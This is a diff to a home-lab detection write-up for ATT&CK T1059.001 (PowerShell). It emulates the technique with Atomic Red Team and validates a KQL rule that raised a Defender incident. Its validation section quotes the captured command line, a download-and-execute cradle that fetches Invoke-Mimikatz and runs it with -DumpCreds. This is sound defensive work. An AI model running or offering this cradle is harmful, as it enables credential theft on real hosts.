@@ -1,7 +1,5 @@
 # T1059.001 — Command and Scripting Interpreter: PowerShell
 
-🚧 Work in progress 🚧
-
 **Tactic:** Execution
 **ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)
 **Status:** ✅ Detected
@@ -18,23 +16,17 @@ that distinguish malicious use from benign administration.
 
 Simulated with Atomic Red Team, using the assumed-breach model where tests run directly on the victim endpoint.
 
-​`
+```powershell
 Import-Module .\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1 -Force
-`
-
-`
 Invoke-AtomicTest T1059.001 -GetPrereqs
-`
-
-`
 Invoke-AtomicTest T1059.001
-`
+```
 
 Cleanup after testing to return the host to a known-good state:
 
-​`
+```powershell
 Invoke-AtomicTest T1059.001 -Cleanup
-​`
+```
 
 ## Telemetry source
  
@@ -73,5 +65,28 @@ Event
 
 ## Validation
 
-To-Do..
+The analytics rule fired and raised a live incident in the Microsoft Defender portal (**"T1059.001 - Suspicious PowerShell Execution"**) correctly attributed to the host `CLIENT01.lab.local`, grouping 19 related events.
 
+
+<img src="screenshots/incident-overview.png" width="650" alt="Incident raised in the Defender portal, attributed to CLIENT01">
+
+
+Inspecting the captured event shows a download-and-execute cradle for **Mimikatz**, a credential-dumping tool, pulled into memory and run with `-DumpCreds`:
+
+
+<img src="screenshots/incident-command.png" width="450" alt="Captured process command line showing the Invoke-Mimikatz download cradle">
+
+
+The captured command line:
+
+​```
+cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString(
+'.../PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+​```
+
+This validates the detection pipeline end to end: an attacker technique was emulated on the endpoint, captured by Sysmon, forwarded through the AMA/DCR pipeline, matched by the KQL analytics rule, and surfaced as an incident mapped to T1059.001.
+
+## Detection lifecycle covered
+ 
+Emulate (Atomic Red Team) → confirm telemetry (Sysmon EID 1) → detect (KQL analytics rule)
+→ raise incident (Sentinel/Defender) → document (this writeup). FP tuning noted for production.
